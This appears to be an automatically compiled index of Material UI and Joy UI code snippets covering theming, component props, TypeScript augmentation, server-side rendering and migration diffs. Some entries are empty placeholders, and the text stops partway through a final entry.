TITLE: Using Flexbox Gap in Stack
DESCRIPTION: This example demonstrates how to use flexbox gap for spacing implementation in Stack by setting the 'useFlexGap' prop to true. This removes known limitations but may not be fully supported in all browsers.

LANGUAGE: jsx
CODE:
{"demo": "FlexboxGapStack.js", "bg": true}

----------------------------------------

TITLE: Using Switch Component with TypeScript and Custom Root
DESCRIPTION: Illustrates how to specify a custom component type for the root slot when using TypeScript.

LANGUAGE: tsx
CODE:
<Switch<typeof CustomComponent> slots={{ root: CustomComponent }} customProp />

----------------------------------------

TITLE: Customizing Autocomplete Option Appearance
DESCRIPTION: Shows how to customize the appearance of Autocomplete options using the renderOption prop and AutocompleteOption component.

LANGUAGE: jsx
CODE:
<Autocomplete
  options={countries}
  renderOption={(props, option) => (
    <AutocompleteOption {...props}>
      <ListItemDecorator>
        <AspectRatio ratio="1" sx={{ width: 20 }}>
          <img
            srcSet={`https://flagcdn.com/w40/${option.code.toLowerCase()}.png 2x`}
            src={`https://flagcdn.com/w20/${option.code.toLowerCase()}.png`}
            alt=""
          />
        </AspectRatio>
      </ListItemDecorator>
      {option.label}
    </AutocompleteOption>
  )}
/>

----------------------------------------

TITLE: Implementing Basic Transfer List in React with Material-UI
DESCRIPTION: This snippet demonstrates a basic transfer list component that allows users to move items between two lists. It includes buttons for moving all items at once.

LANGUAGE: JavaScript
CODE:
"TransferList.js"

----------------------------------------

TITLE: Server-Side Rendering Handler Implementation
DESCRIPTION: Implements the main server-side rendering logic including React component rendering and CSS extraction.

LANGUAGE: jsx
CODE:
import express from 'express';
import * as React from 'react';
import * as ReactDOMServer from 'react-dom/server';
import CssBaseline from '@mui/material/CssBaseline';
import { ThemeProvider } from '@mui/material/styles';
import { CacheProvider } from '@emotion/react';
import createEmotionServer from '@emotion/server/create-instance';
import App from './App';
import theme from './theme';
import createEmotionCache from './createEmotionCache';

function handleRender(req, res) {
  const cache = createEmotionCache();
  const { extractCriticalToChunks, constructStyleTagsFromChunks } =
    createEmotionServer(cache);

  // Render the component to a string.
  const html = ReactDOMServer.renderToString(
    <CacheProvider value={cache}>
      <ThemeProvider theme={theme}>
        <CssBaseline />
        <App />
      </ThemeProvider>
    </CacheProvider>,
  );

  // Grab the CSS from emotion
  const emotionChunks = extractCriticalToChunks(html);
  const emotionCss = constructStyleTagsFromChunks(emotionChunks);

  // Send the rendered page back to the client.
  res.send(renderFullPage(html, emotionCss));
}

const app = express();

app.use('/build', express.static('build'));

app.use(handleRender);

const port = 3000;
app.listen(port);

----------------------------------------

TITLE: Using Switch Component with TypeScript and Custom Element
DESCRIPTION: Shows how to use the Switch component with a custom primitive element in TypeScript.

LANGUAGE: tsx
CODE:
<Switch<'input'> slots={{ root: 'input' }} autoFocus={true} />

----------------------------------------

TITLE: Implementing Responsive Columns in React Masonry
DESCRIPTION: Shows how to use responsive values for the 'columns' prop to create a responsive Masonry layout.

LANGUAGE: jsx
CODE:
{"demo": "ResponsiveColumns.js", "bg": true}

----------------------------------------

TITLE: Customizing Typography Element Mapping Globally
DESCRIPTION: JavaScript code to customize the global mapping of typography variants to HTML elements using Material UI's theme.

LANGUAGE: js
CODE:
const theme = createTheme({
  components: {
    MuiTypography: {
      defaultProps: {
        variantMapping: {
          h1: 'h2',
          h2: 'h2',
          h3: 'h2',
          h4: 'h2',
          h5: 'h2',
          h6: 'h2',
          subtitle1: 'h2',
          subtitle2: 'h2',
          body1: 'span',
          body2: 'span',
        },
      },
    },
  },
});

----------------------------------------

TITLE: Implementing Fluid Container in React with Material-UI
DESCRIPTION: This snippet demonstrates how to use a fluid Container component with a maximum width constraint. The maxWidth prop determines the upper bound of the container's width.

LANGUAGE: JSX
CODE:
<Container maxWidth="sm">

----------------------------------------

TITLE: Basic Border Styling with sx Prop in JSX
DESCRIPTION: Examples of using the border-related properties with the sx prop, showing theme-aware border width, color and radius settings.

LANGUAGE: jsx
CODE:
<Box sx={{ border: 1 }} />
// equivalent to border: '1px solid black'

<Box sx={{ borderColor: 'primary.main' }} />
// equivalent to borderColor: theme => theme.palette.primary.main

<Box sx={{ borderRadius: 2 }} />
// equivalent to borderRadius: theme => 2 * theme.shape.borderRadius

----------------------------------------

TITLE: Basic FormControl Structure Example
DESCRIPTION: Demonstrates the basic structure of using FormControl to wrap form elements.

LANGUAGE: jsx
CODE:
<FormControl>
  <input>
  <button>Submit</button>
</FormControl>

----------------------------------------

TITLE: Rendering Standard Image List in React
DESCRIPTION: This snippet demonstrates how to create a standard image list with uniform container size, ratio, and spacing. It uses the ImageList and ImageListItem components from Material-UI.

LANGUAGE: JSX
CODE:
{"demo": "StandardImageList.js"}

----------------------------------------

TITLE: Customizing Switch Role for Accessibility
DESCRIPTION: Example of changing the Switch component's role to 'switch' for improved accessibility support.

LANGUAGE: jsx
CODE:
<Switch slotProps={{ input: { role: 'switch' } }}>

----------------------------------------

TITLE: Implementing Image Avatars in React MUI
DESCRIPTION: Image avatars can be created by passing standard img props src or srcSet to the Avatar component.

LANGUAGE: JSX
CODE:
ImageAvatars.js referenced but not provided in the input text

----------------------------------------

TITLE: Implementing Accessible Click-Away Listener in React
DESCRIPTION: Example showing how to implement Click-Away Listener with proper accessibility attributes to prevent screen reader issues, particularly important for NVDA users on Firefox.

LANGUAGE: tsx
CODE:
<ClickAwayListener>
  <div role="presentation">
    <h1>non-interactive heading</h1>
  </div>
</ClickAwayListener>

----------------------------------------

TITLE: Updating MuiThemeProvider import
DESCRIPTION: Replace MuiThemeProvider with ThemeProvider from @mui/material/styles.

LANGUAGE: diff
CODE:
-import { MuiThemeProvider } from '@mui/material/styles';
+import { ThemeProvider } from '@mui/material/styles';

----------------------------------------

TITLE: Customizing Badge Component Props with slotProps
DESCRIPTION: Example showing how to add a custom CSS class to the badge slot of the Badge component using the slotProps prop.

LANGUAGE: jsx
CODE:
<Badge slotProps={{ badge: { className: 'my-badge' } }} />

----------------------------------------

TITLE: Creating Deletable Chips in React
DESCRIPTION: Illustrates the implementation of deletable Chip components using the onDelete prop.

LANGUAGE: JSX
CODE:
{"demo": "DeletableChips.js"}

----------------------------------------

TITLE: System Props Migration Example
DESCRIPTION: Example showing the migration from deprecated system props to the sx prop syntax.

LANGUAGE: jsx
CODE:
- <Box mt={2} />
+ <Box sx={{ mt: 2 }} />

----------------------------------------

TITLE: Client-Side Hydration Setup
DESCRIPTION: Implements the client-side hydration process using the same theme and cache configuration as the server.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import * as ReactDOM from 'react-dom';
import CssBaseline from '@mui/material/CssBaseline';
import { ThemeProvider } from '@mui/material/styles';
import { CacheProvider } from '@emotion/react';
import App from './App';
import theme from './theme';
import createEmotionCache from './createEmotionCache';

const cache = createEmotionCache();

function Main() {
  return (
    <CacheProvider value={cache}>
      <ThemeProvider theme={theme}>
        <CssBaseline />
        <App />
      </ThemeProvider>
    </CacheProvider>
  );
}

ReactDOM.hydrateRoot(document.querySelector('#root'), <Main />);

----------------------------------------

TITLE: Installing Material Icons Package
DESCRIPTION: Commands to install the @mui/icons-material package using different package managers

LANGUAGE: bash
CODE:
npm install @mui/icons-material@next

LANGUAGE: bash
CODE:
pnpm add @mui/icons-material@next

LANGUAGE: bash
CODE:
yarn add @mui/icons-material@next

----------------------------------------

TITLE: Babel Plugin Configuration
DESCRIPTION: Configuration for babel-plugin-import to optimize Material UI imports.

LANGUAGE: javascript
CODE:
const plugins = [
  [
    'babel-plugin-import',
    {
      libraryName: '@mui/material',
      libraryDirectory: '',
      camel2DashComponentName: false,
    },
    'core',
  ],
  [
    'babel-plugin-import',
    {
      libraryName: '@mui/icons-material',
      libraryDirectory: '',
      camel2DashComponentName: false,
    },
    'icons',
  ],
];

module.exports = { plugins };

----------------------------------------

TITLE: Implementing a Basic Stepper in React
DESCRIPTION: This code demonstrates the basic implementation of a Stepper component with multiple Step children. It shows how to structure a simple stepper interface.

LANGUAGE: jsx
CODE:
<Stepper>
  <Step>Step 1</Step>
  <Step>Step 2</Step>
  <Step>Step 3</Step>
</Stepper>

----------------------------------------

TITLE: TypeScript Interface Augmentation for New Color Palettes
DESCRIPTION: Demonstrates how to augment the theme's interfaces in TypeScript to include new color palettes. This ensures type safety when using custom palettes in Joy UI components.

LANGUAGE: typescript
CODE:
// You can put this to any file that's included in your tsconfig
import type { PaletteRange } from '@mui/joy/styles';

declare module '@mui/joy/styles' {
  interface ColorPalettePropOverrides {
    // apply to all Joy UI components that support `color` prop
    secondary: true;
  }

  interface Palette {
    // this will make the node `secondary` configurable in `extendTheme`
    // and add `secondary` to the theme's palette.
    secondary: PaletteRange;
  }
}

----------------------------------------

TITLE: Disabling Focus Enforcement in React Modal
DESCRIPTION: Shows how to disable the focus trap behavior of the Modal component, which can be useful when users need to interact with other parts of the page.

LANGUAGE: JSX
CODE:
<Modal disableEnforceFocus />

----------------------------------------

TITLE: Implementing useButton Hook
DESCRIPTION: Basic implementation using the useButton hook from MUI Base

LANGUAGE: tsx
CODE:
import * as React from 'react';
import { useButton } from '@mui/base/useButton';

export default function App() {
  const { getRootProps } = useButton();
  return (
    <button type="button" {...getRootProps()}>
      Click Me
    </button>
  );
}

----------------------------------------

TITLE: Maximum Value Badge in React
DESCRIPTION: Shows how to implement a maximum value cap for badge content using the max prop.

LANGUAGE: jsx
CODE:
BadgeMax.js referenced but not provided

----------------------------------------

TITLE: Alert Import Update
DESCRIPTION: Moving Alert component imports from lab to core

LANGUAGE: diff
CODE:
-import Alert from '@mui/lab/Alert';
-import AlertTitle from '@mui/lab/AlertTitle';
+import Alert from '@mui/material/Alert';
+import AlertTitle from '@mui/material/AlertTitle';

----------------------------------------

TITLE: Creating Enhanced Transfer List with Checkbox and Counter in React
DESCRIPTION: This example shows an enhanced transfer list that replaces 'move all' buttons with a 'select all / select none' checkbox and adds a counter for selected items.

LANGUAGE: JavaScript
CODE:
"SelectAllTransferList.js"

----------------------------------------

TITLE: Customizing Checkbox Accessibility in React
DESCRIPTION: This snippet demonstrates how to add accessibility attributes to a checkbox when a label can't be used. It shows the usage of the 'inputProps' prop to apply aria-label to the checkbox.

LANGUAGE: JSX
CODE:
<Checkbox
  value="checkedA"
  inputProps={{
    'aria-label': 'Checkbox A',
  }}
/>

----------------------------------------

TITLE: Basic Select Component Usage in React
DESCRIPTION: Demonstrates the basic usage of the Select component with Option children. This snippet shows how to import the necessary components and create a simple select dropdown.

LANGUAGE: jsx
CODE:
import Select from '@mui/joy/Select';
import Option from '@mui/joy/Option';

export default function SelectBasic() {
  return (
    <Select defaultValue="dog">
      <Option value="dog">Dog</Option>
      <Option value="cat">Cat</Option>
    </Select>
  );
}

----------------------------------------

TITLE: Badge Positioning with Overlap in React
DESCRIPTION: Shows how to position badges relative to wrapped elements using the overlap prop.

LANGUAGE: jsx
CODE:
BadgeOverlap.js referenced but not provided

----------------------------------------

TITLE: Split Button Implementation - React
DESCRIPTION: Example showing how to create a split button using Button Group where one button triggers the main action and another shows a dropdown menu.

LANGUAGE: jsx
CODE:
import SplitButton from './SplitButton.js'

----------------------------------------

TITLE: Adding Custom Color to Palette in TypeScript
DESCRIPTION: This example shows how to add a custom color to the palette using TypeScript module augmentation.

LANGUAGE: typescript
CODE:
declare module '@mui/material/styles' {
  interface Palette {
    custom: Palette['primary'];
  }

  interface PaletteOptions {
    custom?: PaletteOptions['primary'];
  }
}

declare module '@mui/material/Button' {
  interface ButtonPropsColorOverrides {
    custom: true;
  }
}

----------------------------------------

TITLE: Installing Material Icons with npm/pnpm/yarn
DESCRIPTION: Commands to install the Material Icons package using different package managers.

LANGUAGE: bash
CODE:
npm install @mui/icons-material

LANGUAGE: bash
CODE:
pnpm add @mui/icons-material

LANGUAGE: bash
CODE:
yarn add @mui/icons-material

----------------------------------------

TITLE: Configuring Font Family in Material UI Theme
DESCRIPTION: Example of customizing the font family in a Material UI theme to use system fonts instead of the default Roboto font.

LANGUAGE: javascript
CODE:
const theme = createTheme({
  typography: {
    fontFamily: [
      '-apple-system',
      'BlinkMacSystemFont',
      '"Segoe UI"',
      'Roboto',
      '"Helvetica Neue"',
      'Arial',
      'sans-serif',
      '"Apple Color Emoji"',
      '"Segoe UI Emoji"',
      '"Segoe UI Symbol"',
    ].join(','),
  },
});

----------------------------------------

TITLE: Positioning Switch Labels in React
DESCRIPTION: Shows how to change the placement of labels for switches in Material-UI.

LANGUAGE: jsx
CODE:
{"demo": "FormControlLabelPosition.js"}

----------------------------------------

TITLE: Implementing Nonce in Style Tags
DESCRIPTION: JSX implementation showing how to add nonce to style tags for Emotion integration

LANGUAGE: jsx
CODE:
<style
  data-emotion={`${style.key} ${style.ids.join(' ')}`}
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: style.css }}
/>

----------------------------------------

TITLE: Overriding Component Styles for Specific States
DESCRIPTION: Demonstrates how to override styles for a component in a specific state using the component's class selector.

LANGUAGE: javascript
CODE:
import { listItemButtonClasses } from '@mui/joy/ListItemButton';

extendTheme({
  components: {
    JoyListItemButton: {
      styleOverrides: {
        root: {
          [`&.${listItemButtonClasses.selected}`]: {
            color: 'rgba(255 255 255 / 0.7)',
          },
        },
      },
    },
  },
});

----------------------------------------

TITLE: Implementing Custom Child Element for React Tooltip
DESCRIPTION: Demonstrates how to create a custom React component that spreads props to the underlying DOM element, allowing it to work properly as a child of the Tooltip component.

LANGUAGE: jsx
CODE:
const MyComponent = React.forwardRef(function MyComponent(props, ref) {
  //  Spread the props to the underlying DOM element.
  return (
    <div {...props} ref={ref}>
      Bin
    </div>
  );
});

// ...

<Tooltip title="Delete">
  <MyComponent />
</Tooltip>;

----------------------------------------

TITLE: Implementing Responsive Spacing in React Masonry
DESCRIPTION: Demonstrates the use of responsive values for the 'spacing' prop to create adaptive spacing in a Masonry layout.

LANGUAGE: jsx
CODE:
{"demo": "ResponsiveSpacing.js", "bg": true}

----------------------------------------

TITLE: Badge Visibility Control in React
DESCRIPTION: Demonstrates controlling badge visibility using the invisible prop and showZero functionality.

LANGUAGE: jsx
CODE:
BadgeVisibility.js referenced but not provided

----------------------------------------

TITLE: Inferring Dimensions from Children in React Skeleton
DESCRIPTION: Demonstrates how to use the Skeleton component to wrap other components, inferring width and height from its children.

LANGUAGE: jsx
CODE:
loading ? (
  <Skeleton variant="circular">
    <Avatar />
  </Skeleton>
) : (
  <Avatar src={data.avatar} />
)

----------------------------------------

TITLE: Performance Optimized Accordion
DESCRIPTION: Example showing how to optimize Accordion performance by unmounting content when collapsed.

LANGUAGE: jsx
CODE:
<Accordion slotProps={{ transition: { unmountOnExit: true } }} />

----------------------------------------

TITLE: Implementing Color Contrast in React with MUI Base
DESCRIPTION: Demonstrates how to implement proper color contrast in a MUI Base component. This is important for ensuring text readability against different backgrounds.

LANGUAGE: jsx
CODE:
{"demo": "ColorContrast.js", "defaultCodeOpen": false}

----------------------------------------

TITLE: Implementing unstable_styleFunctionSx with Custom Components in React
DESCRIPTION: This snippet demonstrates how to use the unstable_styleFunctionSx utility to enable the sx prop functionality with custom, non-MUI components. It creates a styled component that can accept sx prop styles.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import { unstable_styleFunctionSx } from '@mui/system';
import styled from 'styled-components';

const MyComponent = styled('div')(unstable_styleFunctionSx);

export default function StyleFunctionSxDemo() {
  return (
    <MyComponent sx={{ m: 1, p: 2, border: '1px solid', borderColor: 'primary.main' }}>
      Custom component with the sx prop
    </MyComponent>
  );
}

----------------------------------------

TITLE: Stack Component with White-space Handling
DESCRIPTION: Examples showing how to handle white-space nowrap issues with Stack component.

LANGUAGE: jsx
CODE:
<Stack direction="row">
  <Typography noWrap>

LANGUAGE: jsx
CODE:
<Stack direction="row" sx={{ minWidth: 0 }}>
  <Typography noWrap>

----------------------------------------

TITLE: Rendering Reverse Alternating Timeline in React
DESCRIPTION: Demonstrates how to create a timeline that displays events on alternating sides in reverse order.

LANGUAGE: jsx
CODE:
{"demo": "AlternateReverseTimeline.js"}

----------------------------------------

TITLE: Creating Responsive Grid Layout with Multiple Breakpoints
DESCRIPTION: Shows how to create a responsive grid layout that changes based on different viewport sizes using multiple breakpoint props.

LANGUAGE: JSX
CODE:
<Grid container spacing={2}>
  <Grid item xs={6} md={8}>
    <Item>xs=6 md=8</Item>
  </Grid>
  <Grid item xs={6} md={4}>
    <Item>xs=6 md=4</Item>
  </Grid>
  <Grid item xs={6} md={4}>
    <Item>xs=6 md=4</Item>
  </Grid>
  <Grid item xs={6} md={8}>
    <Item>xs=6 md=8</Item>
  </Grid>
</Grid>

----------------------------------------

TITLE: Creating Styled Components with Pigment CSS
DESCRIPTION: Demonstrates how to create styled components using the styled API, including variant-based styling.

LANGUAGE: javascript
CODE:
import { styled } from '@pigment-css/react';

const Heading = styled('div')({
  fontSize: '2rem',
  color: '#9FADBC',
  fontWeight: 'bold',
  margin: '1rem',
  variants: [
    {
      props: { variant: 'success' },
      style: { color: '#23AD79' },
    },
    {
      props: { size: 'small' },
      style: { fontSize: '1.5rem' },
    },
  ],
});

const DynamicHeading = styled('h1')({
  color: ({ isError }) => (isError ? 'red' : 'black'),
});

----------------------------------------

TITLE: CSS State Classes Example
DESCRIPTION: Shows how to customize component states using CSS specificity with pseudo-classes and Material UI state classes.

LANGUAGE: css
CODE:
.Button {
  color: black;
}

/* Increase the specificity */
.Button:disabled {
  color: white;
}

LANGUAGE: jsx
CODE:
<Button disabled className="Button">

----------------------------------------

TITLE: Importing Basic Stepper Components in React
DESCRIPTION: Basic imports required to use the core Stepper components from Material UI.

LANGUAGE: jsx
CODE:
import Stepper from '@mui/material/Stepper';
import Step from '@mui/material/Step';
import StepLabel from '@mui/material/StepLabel';

----------------------------------------

TITLE: Adjusting Border Radius with MUI Box Component in JSX
DESCRIPTION: Demonstrates various ways to set border-radius using the MUI Box component and the sx prop. Includes percentage, theme-based, and pixel values.

LANGUAGE: jsx
CODE:
<Box sx={{ borderRadius: '50%' }}>…
<Box sx={{ borderRadius: 1 }}>… // theme.shape.borderRadius * 1
<Box sx={{ borderRadius: '16px' }}>…

----------------------------------------

TITLE: Creating Styled Component with Color Inversion
DESCRIPTION: Shows how to create a styled component with color inversion using the styled API and solid inversion utility.

LANGUAGE: jsx
CODE:
const Parent = styled('div')([{ ...baseStyles }, applySolidInversion('neutral')]);

----------------------------------------

TITLE: TypeScript Grid Breakpoint Configuration
DESCRIPTION: Shows how to configure custom breakpoints in TypeScript using module augmentation for the Material-UI theme system.

LANGUAGE: TypeScript
CODE:
declare module '@mui/system' {
  interface BreakpointOverrides {
    // Your custom breakpoints
    laptop: true;
    tablet: true;
    mobile: true;
    desktop: true;
    // Remove default breakpoints
    xs: false;
    sm: false;
    md: false;
    lg: false;
    xl: false;
  }
}

----------------------------------------

TITLE: Using Custom Components with TypeScript in React Menu
DESCRIPTION: This example illustrates how to specify a custom component type for the root slot in TypeScript, allowing for safe prop usage.

LANGUAGE: tsx
CODE:
<Menu<typeof CustomComponent> slots={{ root: CustomComponent }} customProp />

----------------------------------------

TITLE: Implementing Accessible Tooltip in React
DESCRIPTION: This example shows how to create an accessible tooltip using the describeChild prop to provide an accessible description for the child element.

LANGUAGE: jsx
CODE:
<Tooltip title="Delete" describeChild>
  <IconButton>
    <DeleteIcon />
  </IconButton>
</Tooltip>

----------------------------------------

TITLE: Configuring Third-party Icons with Joy UI
DESCRIPTION: Example of how to configure third-party icons to work with Joy UI components using CSS variables and GlobalStyles.

LANGUAGE: jsx
CODE:
import { CssVarsProvider } from '@mui/joy/styles';
import GlobalStyles from '@mui/joy/GlobalStyles';

function App() {
  return (
    <CssVarsProvider>
      <GlobalStyles styles={{
        '{selector}': {
          color: "var(--Icon-color)",
          margin: "var(--Icon-margin)",
          fontSize: "var(--Icon-fontSize, 20px)",
          width: "1em",
          height: "1em"
        }
      }}>
    </CssVarsProvider>
  )
}

----------------------------------------

TITLE: Path Import Optimization
DESCRIPTION: Demonstrates the optimized path import pattern for faster development builds.

LANGUAGE: javascript
CODE:
// 🚀 Fast
import Button from '@mui/material/Button';
import TextField from '@mui/material/TextField';

----------------------------------------

TITLE: Positioned Popper Implementation in React
DESCRIPTION: Demonstrates how to create a positioned Popper component, allowing for precise placement of the popper relative to its anchor element.

LANGUAGE: JavaScript
CODE:
{"demo": "PositionedPopper.js"}

----------------------------------------

TITLE: Basic Usage of Skeleton Component in React
DESCRIPTION: Demonstrates how to conditionally render a Skeleton component as a placeholder for an image while content is loading.

LANGUAGE: jsx
CODE:
{
  item ? (
    <img
      style={{
        width: 210,
        height: 118,
      }}
      alt={item.title}
      src={item.src}
    />
  ) : (
    <Skeleton variant="rectangular" width={210} height={118} />
  );
}

----------------------------------------

TITLE: Customizing Default Color Values in Joy UI Theme
DESCRIPTION: Shows how to extend the Joy UI theme to change the default HEX codes for colors while maintaining the palette pattern. This example modifies the primary color palette for the dark color scheme.

LANGUAGE: javascript
CODE:
import { extendTheme } from '@mui/joy/styles';

const theme = extendTheme({
  colorSchemes: {
    dark: {
      palette: {
        primary: {
          50: '#C0CCD9',
          100: '#A5B8CF',
          200: '#6A96CA',
          300: '#4886D0',
          400: '#2178DD',
          500: '#096BDE',
          600: '#1B62B5',
          700: '#265995',
          800: '#2F4968',
          900: '#2F3C4C',
        },
      },
    },
  },
});

// Then, pass it to `<CssVarsProvider theme={theme}>`.

----------------------------------------

TITLE: Customizing Input Slots
DESCRIPTION: Demonstrates how to override default slots with custom components or elements.

LANGUAGE: jsx
CODE:
<Input slots={{ root: 'aside', input: CustomInput }} />

----------------------------------------

TITLE: Next.js Link Integration
DESCRIPTION: Shows how to integrate the Joy UI Link component with Next.js routing system using the Next.js Link component.

LANGUAGE: js
CODE:
import NextLink from 'next/link';
import Link from '@mui/joy/Link';

<NextLink href="/docs" passHref>
  <Link>Read doc</Link>
</NextLink>;

----------------------------------------

TITLE: Implementing Column Grouping in React Table
DESCRIPTION: Example showing how to create grouped column headers by nesting multiple TableRow components within TableHead.

LANGUAGE: jsx
CODE:
<TableHead>
  <TableRow />
  <TableRow />
</TableHead>

----------------------------------------

TITLE: Styling Sheet Component with sx Prop
DESCRIPTION: Example of using the sx prop to apply custom styling to the Sheet component including layout, spacing, and visual properties.

LANGUAGE: jsx
CODE:
<Sheet
  sx={{
    width: 300,
    mx: 'auto', // margin left & right
    my: 4, // margin top & bottom
    py: 3, // padding top & bottom
    px: 2, // padding left & right
    display: 'flex',
    flexDirection: 'column',
    gap: 2,
    borderRadius: 'sm',
    boxShadow: 'md',
  }}
>
  Welcome!
</Sheet>

----------------------------------------

TITLE: Defining Color Schemes in JavaScript
DESCRIPTION: This example shows how to define and customize both light and dark color schemes in Material UI.

LANGUAGE: javascript
CODE:
import { createTheme } from '@mui/material/styles';

const theme = createTheme({
  colorSchemes: {
    light: {
      palette: {
        primary: {
          main: '#FF5733',
        },
        // ...other tokens
      },
    },
    dark: {
      palette: {
        primary: {
          main: '#E0C2FF',
        },
        // ...other tokens
      },
    },
  },
});

----------------------------------------

TITLE: Creating Quilted Image List in React
DESCRIPTION: This code snippet shows how to implement a quilted image list that emphasizes certain items over others using varied container sizes and ratios. It creates a hierarchy in the image collection.

LANGUAGE: JSX
CODE:
{"demo": "QuiltedImageList.js"}

----------------------------------------

TITLE: Handling Disabled Elements with React Tooltip
DESCRIPTION: Demonstrates how to use a wrapper element to make tooltips work with disabled elements, and includes a note about Safari compatibility.

LANGUAGE: jsx
CODE:
<Tooltip title="You don't have permission to do this">
  <span>
    <button disabled={disabled} style={disabled ? { pointerEvents: 'none' } : {}}>
      A disabled button
    </button>
  </span>
</Tooltip>

----------------------------------------

TITLE: Customizable List Component Example in Joy UI
DESCRIPTION: Illustrates the customization capabilities of Joy UI's List component using built-in CSS variables to match specific design requirements.

LANGUAGE: jsx
CODE:
{{"demo": "../../components/list/ExampleCollapsibleList.js"}}

----------------------------------------

TITLE: Implementing Self-Hosted Fonts in Material UI
DESCRIPTION: Demonstrates how to implement self-hosted fonts using @font-face and Material UI's CssBaseline component with the Raleway font as an example.

LANGUAGE: jsx
CODE:
import RalewayWoff2 from './fonts/Raleway-Regular.woff2';

const theme = createTheme({
  typography: {
    fontFamily: 'Raleway, Arial',
  },
  components: {
    MuiCssBaseline: {
      styleOverrides: `
        @font-face {
          font-family: 'Raleway';
          font-style: normal;
          font-display: swap;
          font-weight: 400;
          src: local('Raleway'), local('Raleway-Regular'), url(${RalewayWoff2}) format('woff2');
          unicodeRange: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF;
        }
      `,
    },
  },
});

return (
  <ThemeProvider theme={theme}>
    <CssBaseline />
    <Box sx={{ fontFamily: 'Raleway' }}>Raleway</Box>
  </ThemeProvider>
);

----------------------------------------

TITLE: TypeScript Usage with Custom Component
DESCRIPTION: Examples of using Input component with TypeScript, showing custom component and primitive element typing.

LANGUAGE: tsx
CODE:
<Input<typeof CustomComponent> slots={{ root: CustomComponent }} customProp />

LANGUAGE: tsx
CODE:
<Input<'textarea'> slots={{ root: 'textarea' }} rows={2} />

----------------------------------------

TITLE: Implementing Click-Away Listener with Accessibility
DESCRIPTION: Example showing how to implement the Click-Away Listener component with proper accessibility attributes to prevent screen reader issues.

LANGUAGE: tsx
CODE:
<ClickAwayListener>
  <div role="presentation">
    <h1>non-interactive heading</h1>
  </div>
</ClickAwayListener>

----------------------------------------

TITLE: Implementing Alternating Timeline in React
DESCRIPTION: Illustrates how to create a timeline that displays events on alternating sides.

LANGUAGE: jsx
CODE:
{"demo": "AlternateTimeline.js"}

----------------------------------------

TITLE: Dot Badge Implementation in React
DESCRIPTION: Demonstrates the dot variant of the badge component for simple notification indicators.

LANGUAGE: jsx
CODE:
DotBadge.js referenced but not provided

----------------------------------------

TITLE: Configuring Stack Theme with Flexbox Gap
DESCRIPTION: Creates a theme configuration to enable flexbox gap by default for all Stack instances using ThemeProvider.

LANGUAGE: js
CODE:
import { ThemeProvider, createTheme } from '@mui/material/styles';
import Stack from '@mui/material/Stack';

const theme = createTheme({
  components: {
    MuiStack: {
      defaultProps: {
        useFlexGap: true,
      },
    },
  },
});

function App() {
  return (
    <ThemeProvider theme={theme}>
      <Stack>…</Stack> {/* uses flexbox gap by default */}
    </ThemeProvider>
  );
}

----------------------------------------

TITLE: Implementing Sticky Tabs in React
DESCRIPTION: Shows how to create sticky tabs using the 'sticky' prop on the TabList component. This is useful for longer content where tabs need to remain visible.

LANGUAGE: jsx
CODE:
<Tabs>
  <TabList sticky="top">
    <Tab>First tab</Tab>
    <Tab>Second tab</Tab>
    <Tab>Third tab</Tab>
  </TabList>
  {/* TabPanel content */}
</Tabs>

----------------------------------------

TITLE: Theming Components with CSS Variables in Joy UI
DESCRIPTION: This snippet shows how to use CSS variables when theming components in Joy UI.

LANGUAGE: jsx
CODE:
extendTheme({
  components: {
    JoyButton: {
      root: ({ theme }) => ({
        // Outputs 'var(--joy-fontFamily-display)'
        fontFamily: theme.vars.fontFamily.display,
      }),
    },
  },
});

----------------------------------------

TITLE: Customizing Table Pagination Options in React
DESCRIPTION: Examples of how to customize the rows per page options in TablePagination component using either simple numbers or objects with value/label pairs.

LANGUAGE: jsx
CODE:
<TablePagination rowsPerPageOptions={[10, 50]} />

LANGUAGE: jsx
CODE:
<TablePagination rowsPerPageOptions={[10, 50, { value: -1, label: 'All' }]} />

----------------------------------------

TITLE: Modifying Chip Component to Preserve Previous Behavior
DESCRIPTION: Example of adding a custom onKeyUp handler to the Chip component to retain the previous behavior of losing focus on ESC key press.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import Chip from '@mui/material/Chip';

export default function ChipExample() {
  const chipRef = React.useRef(null);
  const keyUpHandler = (event) => {
    if (event.key === 'Escape' && chipRef.current) {
      chipRef.current.blur();
    }
  };
  return (
    <Chip
      label="Chip Outlined"
      variant="outlined"
      ref={chipRef}
      onKeyUp={keyUpHandler}
    />
  );
}

----------------------------------------

TITLE: Accessible Accordion Implementation
DESCRIPTION: Example demonstrating proper accessibility attributes for Accordion components following WAI-ARIA guidelines.

LANGUAGE: jsx
CODE:
<Accordion>
  <AccordionSummary id="panel-header" aria-controls="panel-content">
    Header
  </AccordionSummary>
  <AccordionDetails>
    Lorem ipsum dolor sit amet, consectetur adipiscing elit.
  </AccordionDetails>
</Accordion>

----------------------------------------

TITLE: Basic Badge Implementation in React
DESCRIPTION: Demonstrates basic badge usage with text content using primary and secondary colors. The badge is rendered as a wrapper around child elements.

LANGUAGE: jsx
CODE:
SimpleBadge.js referenced but not provided

----------------------------------------

TITLE: Creating CssVarsProvider Component
DESCRIPTION: Creates a CssVarsProvider component using the custom theme configuration. Exports the provider and useColorScheme hook for theme management.

LANGUAGE: javascript
CODE:
import { unstable_createCssVarsProvider as createCssVarsProvider } from '@mui/system';

const { CssVarsProvider, useColorScheme } = createCssVarsProvider({
  defaultColorScheme: {
    light: 'light',
    dark: 'dark',
  },
  theme: myCustomDefaultTheme,
});

export { CssVarsProvider, useColorScheme };

----------------------------------------

TITLE: Configuring Drawer ModalProps
DESCRIPTION: Example showing how to customize the Modal component's props within a temporary Drawer, specifically setting the keepMounted property.

LANGUAGE: jsx
CODE:
<Drawer
  variant="temporary"
  ModalProps={{
    keepMounted: false,
  }}
/>

----------------------------------------

TITLE: Accessible Text Rating Component
DESCRIPTION: Implements an accessible rating component with text labels following WCAG guidelines.

LANGUAGE: JavaScript
CODE:
TextRating.js

----------------------------------------

TITLE: Using CSS Animation with MUI Base in React
DESCRIPTION: Shows how to implement CSS animations using the CSS Animation component from MUI Base. It applies enter and exit class names to trigger animations.

LANGUAGE: jsx
CODE:
{"demo": "CssAnimationComponent.js"}

----------------------------------------

TITLE: Modal TypeScript Type Extension
